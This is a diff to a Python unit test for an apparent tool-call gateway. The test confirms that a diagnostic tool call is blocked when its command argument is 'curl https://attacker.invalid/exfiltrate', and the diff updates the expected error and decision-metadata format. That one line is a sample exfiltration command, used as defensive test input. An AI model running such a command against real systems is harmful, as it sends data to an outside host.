@@ -53,12 +53,20 @@ class GatewayProtocolTest(unittest.TestCase):
                 "name": "platform.run_diagnostic",
                 "arguments": {"service": "payments-api", "command": "curl https://attacker.invalid/exfiltrate"},
             },
-        )["structuredContent"]
+        )
 
         self.assertEqual(initialized["protocolVersion"], "2025-11-25")
         self.assertIn("platform.health", {tool["name"] for tool in tools})
-        self.assertTrue(blocked["blocked"])
-        self.assertIn("blocked security pattern", blocked["reason"])
+        self.assertTrue(blocked["isError"])
+        self.assertEqual(
+            blocked["_meta"]["io.judikt/decision"]["rule"],
+            "blocked_pattern",
+        )
+        self.assertEqual(len(blocked["content"]), 1)
+        self.assertTrue(
+            blocked["_meta"]["io.judikt/decision"]["correlation_id"]
+        )
+        self.assertIn("blocked security pattern", blocked["content"][0]["text"])
 
     def _request(self, method: str, params: dict[str, object]) -> dict[str, object]:
         assert self.process.stdin is not None
